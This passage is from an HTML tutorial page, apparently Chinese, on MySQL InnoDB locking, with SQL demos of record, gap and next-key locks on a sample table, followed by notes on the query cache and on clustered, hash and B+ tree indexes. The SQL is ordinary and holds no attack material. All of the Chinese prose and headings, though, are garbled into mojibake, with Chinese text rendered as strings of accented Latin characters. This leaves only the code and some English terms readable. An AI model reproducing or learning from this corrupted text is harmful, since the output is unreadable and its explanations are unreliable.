<p>éœ€è¦æ³¨æ„çš„ï¼Œå½“æ“ä½œçš„ç´¢å¼•ä¸ºéå”¯ä¸€ç´¢å¼•æ—¶ï¼ŒInnoDB ä¼šå…ˆç”¨ Record Lock é”ä½å¯¹åº”çš„å”¯ä¸€ç´¢å¼•ï¼Œå†ç”¨ Next-Key Lock å’Œ Gap Lock å¯¹è¿™ä¸ªéå”¯ä¸€ç´¢å¼•è¿›è¡Œå¤„ç†ï¼Œè€Œä¸ä»…ä»…æ˜¯é”ä½è¿™ä¸ªéå”¯ä¸€ç´¢å¼•ã€‚</p>
<p>Next-Key Lock é™çº§ä¸º Record Lock ä»…å­˜åœ¨äºæ“ä½œæ‰€æœ‰çš„å”¯ä¸€ç´¢å¼•åˆ—çš„æƒ…å†µã€‚è‹¥å”¯ä¸€ç´¢å¼•ç”±å¤šä¸ªåˆ—ç»„æˆï¼Œè€Œæ“ä½œçš„ä»…æ˜¯å¤šä¸ªå”¯ä¸€ç´¢å¼•åˆ—ä¸­çš„å…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆ InnoDB å­˜å‚¨å¼•æ“ä¾ç„¶ä½¿ç”¨ Next-Key Lock è¿›è¡Œé”å®šã€‚</p>
<h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE IF <span class="keyword">EXISTS</span> `test`;</span><br><span class="line"><span class="keyword">CREATE</span> DATABASE `test`;</span><br><span class="line"></span><br><span class="line">USE `test`;</span><br><span class="line"><span class="keyword">SET</span> NAMES utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for test</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `test`;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `test` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `user_name` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `class` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`),</span><br><span class="line">  KEY `index_class` (`class`) <span class="keyword">USING</span> BTREE COMMENT <span class="string">&#x27;éå”¯ä¸€ç´¢å¼•&#x27;</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of test</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">101</span>, <span class="string">&#x27;one&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">103</span>, <span class="string">&#x27;two&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">105</span>, <span class="string">&#x27;three&#x27;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">107</span>, <span class="string">&#x27;four&#x27;</span>, <span class="number">6</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">110</span>, <span class="string">&#x27;five&#x27;</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">120</span>, <span class="string">&#x27;five&#x27;</span>, <span class="number">88</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">150</span>, <span class="string">&#x27;150&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `test` (`id`, `user_name`, `class`) <span class="keyword">VALUES</span> (<span class="number">180</span>, <span class="string">&#x27;180&#x27;</span>, <span class="number">180</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>



<h5 id="è¡Œé”ç¤ºä¾‹"><a href="#è¡Œé”ç¤ºä¾‹" class="headerlink" title="è¡Œé”ç¤ºä¾‹"></a>è¡Œé”ç¤ºä¾‹</h5><p>äº‹åŠ¡1ä¸æäº¤çš„è¯ï¼Œäº‹åŠ¡2ä¼šå› ä¸ºè·å–ä¸åˆ°é”è€Œç­‰å¾…ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># äº‹åŠ¡<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test1&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># äº‹åŠ¡<span class="number">2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test2&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h5 id="è¡Œé”é€€åŒ–ä¸ºè¡¨é”ç¤ºä¾‹"><a href="#è¡Œé”é€€åŒ–ä¸ºè¡¨é”ç¤ºä¾‹" class="headerlink" title="è¡Œé”é€€åŒ–ä¸ºè¡¨é”ç¤ºä¾‹"></a>è¡Œé”é€€åŒ–ä¸ºè¡¨é”ç¤ºä¾‹</h5><p>äº‹åŠ¡1ä¸æäº¤çš„è¯å°±æ˜¯é”ä½äº†æ•´å¼ è¡¨ã€‚æ­¤æ—¶æ‰§è¡Œäº‹åŠ¡ 2 è¯•å›¾ç”³è¯· id &#x3D; 5 çš„è®°å½•é”ï¼Œäº‹åŠ¡ T2 ä¼šå¡ä½ï¼Œæœ€åè¶…æ—¶å…³é—­äº‹åŠ¡ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># äº‹åŠ¡<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> user_name <span class="operator">=</span> <span class="string">&#x27;one&#x27;</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"># äº‹åŠ¡<span class="number">2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h5 id="ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ç¤ºä¾‹"><a href="#ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ç¤ºä¾‹" class="headerlink" title="ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ç¤ºä¾‹"></a>ä¸¤æ¡ä¸åŒè®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ç¤ºä¾‹</h5><p>è¿™ä¸¤å¤©è®°å½•æ‹¥æœ‰ç›¸åŒçš„ç´¢å¼•ï¼Œäº‹åŠ¡1ä¸æäº¤çš„è¯ï¼Œæ­¤æ—¶æ‰§è¡Œäº‹åŠ¡ 2 è¯•å›¾ç”³è¯· class&#x3D;1 çš„è®°å½•é”ï¼Œäº‹åŠ¡ T2 ä¼šå¡ä½ï¼Œæœ€åè¶…æ—¶å…³é—­äº‹åŠ¡ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># äº‹åŠ¡<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> user_name <span class="operator">=</span> <span class="string">&#x27;one&#x27;</span> <span class="keyword">and</span> class <span class="operator">=</span> <span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"># äº‹åŠ¡<span class="number">2</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> user_name <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span> <span class="keyword">where</span> user_name <span class="operator">=</span> <span class="string">&#x27;two&#x27;</span> <span class="keyword">and</span> class <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h5 id="ä¸´é”®é”ç¤ºä¾‹"><a href="#ä¸´é”®é”ç¤ºä¾‹" class="headerlink" title="ä¸´é”®é”ç¤ºä¾‹"></a>ä¸´é”®é”ç¤ºä¾‹</h5><p>åœ¨äº‹åŠ¡1è¿™ç§æƒ…å†µä¸‹ï¼ŒInnoDB äº‹å®ä¸Šä¼šåŠ ä¸Šä¸‰ç§è¡Œé”ï¼ˆselect * â€¦ from update åŠ çš„æ˜¯è¡Œçº§å†™é”å³ X é”ï¼‰ï¼š</p>
<ul>
<li><p>ç»™ä¸»é”®ç´¢å¼• id &#x3D; 105 åŠ ä¸Š Record Lockã€‚</p>
</li>
<li><p>å¯¹äºéå”¯ä¸€ç´¢å¼• class &#x3D; 3ï¼Œå…¶åŠ ä¸Šçš„æ˜¯ Next-Key Lockï¼Œé”å®šçš„èŒƒå›´æ˜¯ (1ï¼Œ3]ã€‚</p>
</li>
<li><p>å¦å¤–ï¼ŒInnoDB å­˜å‚¨å¼•æ“è¿˜ä¼šå¯¹éå”¯ä¸€ç´¢å¼• class çš„ä¸‹ä¸€ä¸ªé”®å€¼åŠ ä¸Š Gap Lockï¼ˆè¡¨ä¸­ class &#x3D; 3 çš„ä¸‹ä¸ªé”®å€¼æ˜¯ 6ï¼‰ï¼Œæ‰€ä»¥è¿˜æœ‰ä¸€ä¸ª class ç´¢å¼•èŒƒå›´ä¸º ï¼ˆ3ï¼Œ6ï¼‰çš„é—´éš™é”ã€‚</p>
</li>
</ul>
<p>å¯¹äºè¿™æ¡ SQL è¯­å¥ï¼ŒInnoDB å­˜å‚¨å¼•æ“é”å®šçš„ class ç´¢å¼•èŒƒå›´æ˜¯ ï¼ˆ1ï¼Œ6ï¼‰ã€‚</p>
<p>å®ä¾‹1ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># äº‹åŠ¡<span class="number">1</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class <span class="operator">=</span> <span class="number">3</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"></span><br><span class="line"># äº‹åŠ¡<span class="number">2</span></span><br><span class="line"># æ— æ³•æŸ¥è¯¢</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">105</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># æ— æ³•æ’å…¥</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span>(<span class="number">104</span>, &quot;test&quot;, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># å¯ä»¥æŸ¥è¯¢</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class<span class="operator">=</span><span class="number">6</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># å¯ä»¥æŸ¥è¯¢</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class<span class="operator">=</span><span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line"># å¯ä»¥æ’å…¥</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span>(<span class="number">104</span>, &quot;test&quot;, <span class="number">6</span>);</span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<p>å®ä¾‹2ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># äº‹åŠ¡<span class="number">1</span> æ•´ä¸ªè¡¨éƒ½é”ä½äº†</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> class <span class="keyword">between</span> <span class="number">6</span> <span class="keyword">and</span> <span class="number">88</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>



<h2 id="æŸ¥è¯¢ç¼“å­˜"><a href="#æŸ¥è¯¢ç¼“å­˜" class="headerlink" title="æŸ¥è¯¢ç¼“å­˜"></a>æŸ¥è¯¢ç¼“å­˜</h2><p>æ‰§è¡ŒæŸ¥è¯¢è¯­å¥çš„æ—¶å€™ï¼Œä¼šå…ˆæŸ¥è¯¢ç¼“å­˜ã€‚ åœ¨MySQL8.0ç‰ˆæœ¬åç§»å‡ºè¯¥åŠŸèƒ½ï¼Œå¼€å¯æŸ¥è¯¢ç¼“å­˜ååœ¨åŒæ ·çš„æŸ¥è¯¢æ¡ä»¶ä»¥åŠæ•°æ®æƒ…å†µä¸‹ï¼Œä¼šç›´æ¥åœ¨ç¼“å­˜ä¸­è¿”å›ç»“æœã€‚ ç¼“å­˜è™½ç„¶èƒ½å¤Ÿæå‡æ•°æ®åº“çš„æŸ¥è¯¢æ€§èƒ½ï¼Œä½†æ˜¯ç¼“å­˜åŒæ—¶ä¹Ÿå¸¦æ¥äº†é¢å¤–çš„å¼€é”€ï¼Œæ¯æ¬¡æŸ¥è¯¢åéƒ½è¦åšä¸€æ¬¡ç¼“å­˜æ“ä½œï¼Œå¤±æ•ˆåè¿˜è¦é”€æ¯ã€‚å¯¹äºå†™å¯†é›†çš„åº”ç”¨æœ€å¥½ä¸è¦å¼€å¯ã€‚</p>
<h2 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h2><p>é€šè¿‡å”¯ä¸€æ€§ç´¢å¼•ï¼Œå¯ä»¥ä¿è¯æ•°æ®åº“ä¸­æ¯ä¸€è¡Œæ•°æ®çš„å”¯ä¸€æ€§ã€‚</p>
<p>ç´¢å¼•å¯ä»¥å¤§å¤§åŠ å¿«æ•°æ®çš„æ£€ç´¢é€Ÿåº¦ï¼Œå¸®åŠ©æœåŠ¡å™¨é¿å…æ’åºå’Œä¸´æ—¶è¡¨ã€‚ å°†éšæœºIOå˜ä¸ºé¡ºåºIOã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆä¸å¯¹è¡¨ä¸­çš„æ¯ä¸€ä¸ªåˆ—åˆ›å»ºä¸€ä¸ªç´¢å¼•"><a href="#ä¸ºä»€ä¹ˆä¸å¯¹è¡¨ä¸­çš„æ¯ä¸€ä¸ªåˆ—åˆ›å»ºä¸€ä¸ªç´¢å¼•" class="headerlink" title="ä¸ºä»€ä¹ˆä¸å¯¹è¡¨ä¸­çš„æ¯ä¸€ä¸ªåˆ—åˆ›å»ºä¸€ä¸ªç´¢å¼•?"></a>ä¸ºä»€ä¹ˆä¸å¯¹è¡¨ä¸­çš„æ¯ä¸€ä¸ªåˆ—åˆ›å»ºä¸€ä¸ªç´¢å¼•?</h3><ul>
<li><p>è¡¨ä¸­æ•°æ®å¢åˆ å’Œä¿®æ”¹çš„æ—¶å€™ï¼Œç´¢å¼•ä¹Ÿè¦åŠ¨æ€çš„ç»´æŠ¤ï¼Œç´¢å¼•å¤ªå¤šä¼šé™ä½æ•°æ®çš„ç»´æŠ¤é€Ÿåº¦ã€‚</p>
</li>
<li><p>ç´¢å¼•éœ€è¦å ç”¨ç©ºé—´ï¼Œå¦‚æœè¦å»ºç«‹èšæ—ç´¢å¼•çš„è¯ï¼Œéœ€è¦çš„ç©ºé—´å°±ä¼šæ›´å¤§ã€‚</p>
</li>
</ul>
<h4 id="èšç°‡ç´¢å¼•"><a href="#èšç°‡ç´¢å¼•" class="headerlink" title="èšç°‡ç´¢å¼•"></a>èšç°‡ç´¢å¼•</h4><p>æŒ‰ç…§æ¯å¼ è¡¨çš„ä¸»é”®æ„é€ ä¸€é¢—B+æ ‘ï¼ŒåŒæ—¶å¶å­èŠ‚ç‚¹ä¸­å­˜æ”¾çš„å°±æ˜¯æ•´å¼ è¡¨çš„è¡Œè®°å½•æ•°æ®ï¼Œä¹Ÿå°†èšç°‡ç´¢å¼•çš„å¶å­èŠ‚ç‚¹ç§°ä¸ºæ•°æ®é¡µã€‚è¿™ä¸ªç‰¹æ€§å†³å®šäº†ç´¢å¼•ç»„ç»‡è¡¨ä¸­æ•°æ®ä¹Ÿæ˜¯ç´¢å¼•çš„ä¸€éƒ¨åˆ†ï¼Œæ¯å¼ è¡¨åªèƒ½æ‹¥æœ‰ä¸€ä¸ªèšç°‡ç´¢å¼•ã€‚</p>
<p>Innodbé€šè¿‡ä¸»é”®èšé›†æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰å®šä¹‰ä¸»é”®ï¼Œinnodbä¼šé€‰æ‹©éç©ºçš„å”¯ä¸€ç´¢å¼•ä»£æ›¿ã€‚å¦‚æœæ²¡æœ‰è¿™æ ·çš„ç´¢å¼•ï¼ŒInnodbä¼šéšå¼çš„å®šä¹‰ä¸€ä¸ªä¸»é”®æ¥ä½œä¸ºèšç°‡ç´¢å¼•ã€‚</p>
<h3 id="ä½¿ç”¨ç´¢å¼•çš„æ³¨æ„äº‹é¡¹"><a href="#ä½¿ç”¨ç´¢å¼•çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="ä½¿ç”¨ç´¢å¼•çš„æ³¨æ„äº‹é¡¹"></a>ä½¿ç”¨ç´¢å¼•çš„æ³¨æ„äº‹é¡¹</h3><ul>
<li><p>åœ¨ç»å¸¸éœ€è¦æœç´¢çš„åˆ—ä¸Šï¼Œå¯ä»¥åŠ å¿«æœç´¢é€Ÿåº¦ã€‚</p>
</li>
<li><p>åœ¨ç»å¸¸ä½¿ç”¨whereå­å¥çš„åˆ—ä¸Šã€‚</p>
</li>
<li><p>åœ¨ç»å¸¸éœ€è¦æ’åºçš„åˆ—ä¸Šã€‚</p>
</li>
<li><p>å¯¹äºä¸­åˆ°å¤§å‹è¡¨ç´¢å¼•éƒ½æ˜¯éå¸¸æœ‰æ•ˆçš„ï¼Œä½†æ˜¯ç‰¹å¤§è¡¨çš„è¯ç»´æŠ¤å¼€é”€ä¼šå¾ˆå¤§ï¼Œä¸é€‚åˆå»ºç´¢å¼•ã€‚</p>
</li>
<li><p>åœ¨ç»å¸¸ç”¨äºè¿æ¥çš„åˆ—ä¸Šï¼Œè¿™äº›åˆ—ä¸»è¦æ˜¯ä¸€äº›å¤–é”®ï¼Œå¯ä»¥åŠ å¿«è¿æ¥çš„é€Ÿåº¦ã€‚</p>
</li>
<li><p>é¿å…whereå­å¥å¯¹å­—æ®µæ–½åŠ å‡½æ•°ï¼Œè¿™ä¼šé€ æˆæ— æ³•å‘½ä¸­ç´¢å¼•ã€‚</p>
</li>
<li><p>åœ¨ä½¿ç”¨InnoDBæ˜¯ä½¿ç”¨äºä¸šåŠ¡æ— å…³çš„è‡ªå¢ä¸»é”®ä½œä¸ºä¸»é”®,å³ä½¿ç”¨é€»è¾‘ä¸»é”®,è€Œä¸è¦ä½¿ç”¨ä¸šåŠ¡ä¸»é”®; </p>
</li>
<li><p>å°†æŸä¸€åˆ—è®¾ç½®ä¸ºdefault nullï¼Œwhere æ˜¯å¯ä»¥èµ°ç´¢å¼•çš„ï¼Œå¦å¤–ç´¢å¼•åˆ—æ˜¯å¦è®¾ç½®nullæ˜¯ä¸ä¼šå½±å“æ€§èƒ½çš„ã€‚ä½†æ˜¯ï¼Œæœ€å¥½è®¾ç½®ä¸ºnot nullï¼Œå› ä¸ºnulléœ€è¦æ›´å¤šçš„å­˜å‚¨ç©ºé—´å¹¶ä¸”nullå€¼æ— æ³•å‚ä¸æŸäº›è¿ç®—ã€‚</p>
</li>
<li><p>åˆ é™¤é•¿æœŸæœªä½¿ç”¨çš„ç´¢å¼•ï¼Œä¸ç”¨çš„ç´¢å¼•çš„å­˜åœ¨ä¼šé€ æˆä¸å¿…è¦çš„æ€§èƒ½æŸè€— MySQL 5.7 å¯ä»¥é€šè¿‡æŸ¥è¯¢ sys åº“çš„ schema_unused_indexes è§†å›¾æ¥æŸ¥è¯¢å“ªäº›ç´¢å¼•ä»æœªè¢«ä½¿ç”¨; </p>
</li>
<li><p>åœ¨ä½¿ç”¨limit offsetæŸ¥è¯¢ç¼“æ…¢æ—¶ï¼Œå¯ä»¥å€ŸåŠ©ç´¢å¼•æ¥æé«˜æ€§èƒ½ã€‚</p>
</li>
<li><p>å¯¹äºé‚£äº›åœ¨æŸ¥è¯¢ä¸­å¾ˆå°‘ä½¿ç”¨æˆ–è€…å‚è€ƒçš„åˆ—ä¸åº”è¯¥åˆ›å»ºç´¢å¼•ã€‚æ—¢ç„¶è¿™äº›åˆ—å¾ˆå°‘ä½¿ç”¨åˆ°ï¼Œå› æ­¤æœ‰ç´¢å¼•æˆ–è€…æ— ç´¢å¼•ï¼Œå¹¶ä¸èƒ½æé«˜æŸ¥è¯¢é€Ÿåº¦ã€‚ç›¸åï¼Œç”±äºå¢åŠ äº†ç´¢å¼•ï¼Œåè€Œé™ä½äº†ç³»ç»Ÿçš„ç»´æŠ¤é€Ÿåº¦å’Œå¢å¤§äº†ç©ºé—´éœ€æ±‚ã€‚</p>
</li>
<li><p>å¯¹äºé‚£äº›åªæœ‰å¾ˆå°‘æ•°æ®å€¼çš„åˆ—ä¹Ÿä¸åº”è¯¥å¢åŠ ç´¢å¼•ã€‚ç”±äºè¿™äº›åˆ—çš„å–å€¼å¾ˆå°‘ï¼Œä¾‹å¦‚äººäº‹è¡¨çš„æ€§åˆ«åˆ—ï¼Œåœ¨æŸ¥è¯¢çš„ç»“æœä¸­ï¼Œç»“æœé›†çš„æ•°æ®è¡Œå äº†è¡¨ä¸­æ•°æ®è¡Œçš„å¾ˆå¤§æ¯”ä¾‹ï¼Œå³éœ€è¦åœ¨è¡¨ä¸­æœç´¢çš„æ•°æ®è¡Œçš„æ¯”ä¾‹å¾ˆå¤§ã€‚å¢åŠ ç´¢å¼•ï¼Œå¹¶ä¸èƒ½æ˜æ˜¾åŠ å¿«æ£€ç´¢é€Ÿåº¦ã€‚</p>
</li>
<li><p>å¯¹äºé‚£äº›å®šä¹‰ä¸ºtextï¼Œimageå’Œbitæ•°æ®ç±»å‹çš„åˆ—ä¸åº”è¯¥å¢åŠ ç´¢å¼•ã€‚è¿™äº›åˆ—çš„æ•°æ®é‡è¦ä¹ˆç›¸å½“å¤§ï¼Œè¦ä¹ˆå–å€¼å¾ˆå°‘ã€‚</p>
</li>
<li><p>å½“ä¿®æ”¹æ€§èƒ½è¿œè¿œå¤§äºæ£€ç´¢æ€§èƒ½æ—¶ï¼Œä¸åº”è¯¥åˆ›å»ºç´¢å¼•ã€‚å› ä¸º<strong>ä¿®æ”¹æ€§èƒ½å’Œæ£€ç´¢æ€§èƒ½æ˜¯äº’ç›¸çŸ›ç›¾çš„</strong>ã€‚å½“å¢åŠ ç´¢å¼•æ—¶ï¼Œä¼šæé«˜æ£€ç´¢æ€§èƒ½ï¼Œä½†æ˜¯ä¼šé™ä½ä¿®æ”¹æ€§èƒ½ã€‚å½“å‡å°‘ç´¢å¼•æ—¶ï¼Œä¼šæé«˜ä¿®æ”¹æ€§èƒ½ï¼Œé™ä½æ£€ç´¢æ€§èƒ½ã€‚å› æ­¤ï¼Œå½“ä¿®æ”¹æ€§èƒ½è¿œè¿œå¤§äºæ£€ç´¢æ€§èƒ½æ—¶ï¼Œä¸åº”è¯¥åˆ›å»ºç´¢å¼•ã€‚</p>
</li>
</ul>
<h3 id="å“ˆå¸Œç´¢å¼•"><a href="#å“ˆå¸Œç´¢å¼•" class="headerlink" title="å“ˆå¸Œç´¢å¼•"></a>å“ˆå¸Œç´¢å¼•</h3><p>åº•å±‚ä¸ºå“ˆå¸Œè¡¨ï¼Œåœ¨ç»å¤§å¤šæ•°éœ€æ±‚ä¸ºå•æ¡æŸ¥è¯¢æ—¶ï¼Œå¯ä»¥é€‰æ‹©å“ˆå¸Œç´¢å¼•ï¼ŒæŸ¥è¯¢é€Ÿåº¦æœ€å¿«ã€‚</p>
<h3 id="B-æ ‘ç´¢å¼•"><a href="#B-æ ‘ç´¢å¼•" class="headerlink" title="B+æ ‘ç´¢å¼•"></a>B+æ ‘ç´¢å¼•</h3><p><strong>MyISAMï¼š</strong></p>
<p>å¶èŠ‚ç‚¹å­˜æ”¾çš„æ˜¯æ•°æ®è®°å½•çš„åœ°å€ã€‚åœ¨ç´¢å¼•æ£€ç´¢æ—¶ï¼Œé¦–å…ˆæŒ‰ç…§b+treeæœç´¢ç´¢å¼•ï¼Œå¦‚æœkeyå­˜åœ¨ï¼Œåˆ™å–å‡ºdataåŸŸçš„å€¼ï¼Œç„¶åä»¥dataåŸŸçš„å€¼ä¸ºåœ°å€è¯»å–å¯¹åº”çš„æ•°æ®è®°å½•ã€‚è¿™è¢«ç§°ä¸ºéèšç°‡ç´¢å¼•;</p>
<p><strong>InnoDBï¼š</strong></p>
<p>å…¶æ•°æ®æ–‡ä»¶æœ¬èº«å°±æ˜¯ç´¢å¼•æ–‡ä»¶ã€‚æ ‘çš„å¶èŠ‚ç‚¹dataåŸŸä¿å­˜äº†å®Œæ•´çš„æ•°æ®è®°å½•ã€‚è¿™ä¸ªç´¢å¼•çš„keyæ˜¯æ•°æ®åº“çš„ä¸»é”®ï¼Œå› æ­¤InnoDBè¡¨æ•°æ®æ–‡ä»¶æœ¬èº«å°±æ˜¯ä¸»ç´¢å¼•ã€‚ è¿™è¢«ç§°ä¸ºèšç°‡ç´¢å¼•ã€‚ å…¶ä½™ç´¢å¼•éƒ½æ˜¯è¾…åŠ©ç´¢å¼•ï¼Œè¾…åŠ©ç´¢å¼•çš„dataåŸŸå­˜çš„æ—¶ä¸»é”®çš„å€¼è€Œä¸æ˜¯åœ°å€ã€‚åœ¨æ ¹æ®ä¸»ç´¢å¼•æœç´¢æ—¶ï¼Œç›´æ¥æ‰¾åˆ°keyæ‰€åœ¨çš„èŠ‚ç‚¹å³å¯å–å‡ºæ•°æ®ã€‚åœ¨æ ¹æ®è¾…åŠ©ç´¢å¼•æŸ¥æ‰¾æ—¶ï¼Œåˆ™éœ€è¦å…ˆå–å‡ºä¸»é”®çš„å€¼ï¼Œå†èµ°ä¸€éç´¢å¼•ã€‚å› æ­¤ï¼Œåœ¨è®¾è®¡è¡¨æ—¶ï¼Œä¸å»ºè®®ä½¿ç”¨è¿‡é•¿çš„å­—æ®µä½œä¸ºä¸»é”®ï¼Œä¹Ÿä¸å»ºè®®ä½¿ç”¨éå•è°ƒçš„å­—æ®µä½œä¸ºä¸»é”®ï¼Œè¿™æ ·ä¼šé€ æˆä¸»ç´¢å¼•é¢‘ç¹åˆ†è£‚ã€‚</p>
